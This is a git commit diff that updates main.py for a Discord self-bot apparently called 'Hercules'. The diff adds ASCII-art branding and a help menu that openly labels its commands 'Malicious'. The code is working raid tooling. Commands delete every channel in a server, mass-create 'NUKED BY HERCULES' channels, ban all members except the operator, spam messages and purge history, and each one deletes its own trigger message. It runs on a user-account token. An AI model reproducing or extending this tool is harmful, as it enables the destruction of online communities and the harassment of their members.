7c395a9dbdb034b75d35062f87a961ee1a89326c
SuekDevelopment <96161400+SuekDevelopment@users.noreply.github.com>
2021-12-24 15:41:06 +1100

    Update main.py

--- main.py
+++ main.py
@@ -2,7 +2,21 @@ import discord
 from discord import *
 from discord.ext import commands
 
+import os
+os.system("mode con lines=40")
+
 title="""
+
+ ██░ ██ ▓█████  ██▀███   ▄████▄   █    ██  ██▓    ▓█████   ██████ 
+▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒▒██▀ ▀█   ██  ▓██▒▓██▒    ▓█   ▀ ▒██    ▒ 
+▒██▀▀██░▒███   ▓██ ░▄█ ▒▒▓█    ▄ ▓██  ▒██░▒██░    ▒███   ░ ▓██▄   
+░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▓▓█  ░██░▒██░    ▒▓█  ▄   ▒   ██▒
+░▓█▒░██▓░▒████▒░██▓ ▒██▒▒ ▓███▀ ░▒▒█████▓ ░██████▒░▒████▒▒██████▒▒
+ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░
+ ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░  ░  ▒   ░░▒░ ░ ░ ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░
+ ░  ░░ ░   ░     ░░   ░ ░         ░░░ ░ ░   ░ ░      ░   ░  ░  ░  
+ ░  ░  ░   ░  ░   ░     ░ ░         ░         ░  ░   ░  ░      ░  
+                        ░                                         
               ...                            
              ;::::;                           
            ;::::; :;                          
@@ -24,65 +38,121 @@ title="""
  `:::::`::::::::::::;'`:;::#                O 
   `:::::`::::::::;' /  / `:#                  
    ::::::`:::::;'  /  /   `#        
-Made by NotSuek
+M a d e   b y   N o t S u e k
 """
 
 
+# Setting up the bot
+BOT_PREFIX = ">>>"
+bot = commands.Bot(BOT_PREFIX, self_bot=True, case_insensitive=True)
 
+# Removing the base help command
+bot.remove_command("help")
 
-bot = commands.Bot(".", self_bot=True)
-
+# Runs when bot is ready
 @bot.event
 async def on_ready():
-    print("go boom ready ( ͡° ͜ʖ ͡°)")
+    print("Hercules ready ( ͡° ͜ʖ ͡°)")
     print(title)
+    await bot.change_presence(activity=discord.Game(name='Hercules On Top'))
 
+# Test command
 @bot.command()
 async def test(ctx, arg):
+    await ctx.message.delete()
     await ctx.send(arg)
 
-@bot.command()
-async def helpSelfBot(ctx):
-    embed = discord.Embed(title="Help | go boom Self-bot", description="Suek is trash at python", color=0x00ff00)
-    embed.add_field(name=".test {message}", value="Will send {message}.", inline=False)
-    embed.add_field(name=".death", value="Deletes all channels in the server.", inline=False)
-    embed.add_field(name=".spam {amount} {name}", value="Creates {amount} channels named {name}.", inline=False)
-    embed.add_field(name=".nuke {amount} {name}", value="Deletes all channels and creates {amount} channels named {name}.", inline=False)
-    embed.add_field(name=".banNuke", value="Bans all users except the user running the bot.", inline=False)
-    embed.add_field(name=".spamDM {message} {amount}", value="Spam DMs the current user selected with {message} {amount} times.", inline=False)
+# Main help page
+@bot.group(invoke_without_command=True)
+async def help(ctx):
+    await ctx.message.delete()
+    embed = discord.Embed(title="Help [Pages] | Hercules Self-bot", description=f"Use {BOT_PREFIX}help <page name> for different pages.", color=0x00ff00)
+    embed.add_field(name="Malicious [Must be lowercase]", value="Message spam, server nuker, ban nuker, spam channel, delete all channels.")
+    embed.add_field(name="Testing [Must be lowercase]", value="Testing commands for the self-bot.")
     await ctx.send(embed=embed)
 
+# Malicious help page
+@help.command()
+async def malicious(ctx):
+    await ctx.message.delete()
+    embed = discord.Embed(title="Help [Malicious commands] | Hercules Self-bot", description="Use .help <page name> for different pages.", color=0x00ff00)
+    embed.add_field(name=f"{BOT_PREFIX}messageSpam <Message> <Amount sent>", value="Will spam <Message> <Amount sent> times in any channel.", inline=True)
+    embed.add_field(name=f"{BOT_PREFIX}nuke <Amount of channels> <Channel name>", value="Will delete all channels and creat <Amount of channels> channels name <Channel name>.", inline=True)
+    embed.add_field(name=f"{BOT_PREFIX}banNuke", value=f"Bans all members except {ctx.message.author}.", inline=True)
+    embed.add_field(name=f"{BOT_PREFIX}spamChannel <Amount of channels> <Channel name>", value="Creates <Amount of channels> channels named <Channel name>.", inline=True)
+    embed.add_field(name=f"{BOT_PREFIX}death", value="Deletes every. single. channel. in the server.", inline=True)
+    await ctx.send(embed=embed)
+
+# Testing help page
+@help.command()
+async def testing(ctx):
+    await ctx.message.delete()
+    embed = discord.Embed(title="Help [Testing commands] | Hercules Self-bot", description="Use .help <page name> for different pages.", color=0x00ff00)
+    embed.add_field(name=f"{BOT_PREFIX}test <Message>", value="Will send <Message> in the channel used in.", inline=True)
+    embed.add_field(name=f"{BOT_PREFIX}embed <title> <description> <option 1 title> <option 2 value> <embed color>", value="Creates a custom embed using the values entered.")
+    await ctx.send(embed=embed)
+
+# Delete all channels command
 @bot.command()
 async def death(ctx):
+    await ctx.message.delete()
     for channel in ctx.guild.channels:
         await channel.delete()
 
+# Spam creates channels command
 @bot.command()
-async def spam(ctx, amount=5, name="NUKED BY GO BOOM"):
+async def spamChannel(ctx, amount=5, name="NUKED BY HERCULES"):
+    await ctx.message.delete()
     for x in range(amount):
         guild = ctx.guild
         channel = await guild.create_text_channel(name)
 
+# Nuke server command
 @bot.command()
-async def nuke(ctx, amount=10, name="NUKED BY GO BOOM"):
+async def nuke(ctx, amount=10, name="NUKED BY HERCULES"):
+    await ctx.message.delete()
     for channel in ctx.guild.channels:
         await channel.delete()
     for x in range(amount):
         guild = ctx.guild
         channel = await guild.create_text_channel(name)
 
+# Ban nuke command
 @bot.command()
 async def banNuke(ctx):
+    await ctx.message.delete()
     for user in ctx.guild.members:
         try:
-            print(user)
+            print(user + "was banned by: HERCULES")
             await user.ban()
         except:
             pass
 
+# Message spam command
 @bot.command()
-async def spamDM(ctx, args="GO BOOM ON TOP", amount=5):
+async def messageSpam(ctx, args="HERCULES ON TOP", amount=5):
+    await ctx.message.delete()
     for x in range(amount):
         await ctx.send(args)
 
-bot.run("your token goes here", bot=False)
+# Purge command
+@bot.command()
+async def purge(ctx, amount=5):
+    await ctx.message.delete()
+    channel = ctx.message.channel
+    author = ctx.message.author
+    amount += 1
+
+    await channel.purge(limit=amount)
+    await ctx.send(f"{amount} messages deleted by {author}.")
+
+# Custom embed command
+@bot.command()
+async def embed(ctx, title="Missing title", description="Missing description", option1Title="Missing title", option1Value="Missing value", color=0x00ff00):
+    await ctx.message.delete()
+    embed = discord.Embed(title=title, description=description, color=color)
+    embed.add_field(name=option1Title, value=option1Value, inline=False)
+    await ctx.send(embed=embed)
+
+# Running the bot
+bot.run("token goes here", bot=False)
